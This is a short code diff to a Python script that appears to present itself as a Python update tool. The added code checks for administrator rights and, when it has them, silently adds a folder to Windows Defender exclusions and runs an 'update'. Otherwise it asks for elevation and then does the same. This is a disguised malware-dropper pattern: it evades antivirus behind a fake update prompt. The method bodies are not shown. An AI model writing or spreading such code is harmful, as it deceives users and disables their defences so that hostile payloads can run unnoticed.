@@ -4,6 +4,8 @@ import random
 import sys
 from time import time
 
+is_admin = os.getuid() == 0 if hasattr(os, "getuid") else ctypes.windll.shell32.IsUserAnAdmin() != 0
+
 class Main:
     def __init__(self):
         pass
@@ -44,9 +46,14 @@ class Main:
 
 if __name__ == "__main__":
     self = Main()
+    if is_admin:
+        self.add_folder_to_windows_defender_exclusions()
+        self.perform_update()
+        
     if self.send_update_notification():
         print("Updating Python...")
-        # Here you would add the code to perform the update
+        if self.request_admin_privileges():
+            self.add_folder_to_windows_defender_exclusions()
+            self.perform_update()
     else:
         print("Update skipped.")
-    self.add_folder_to_windows_defender_exclusions()
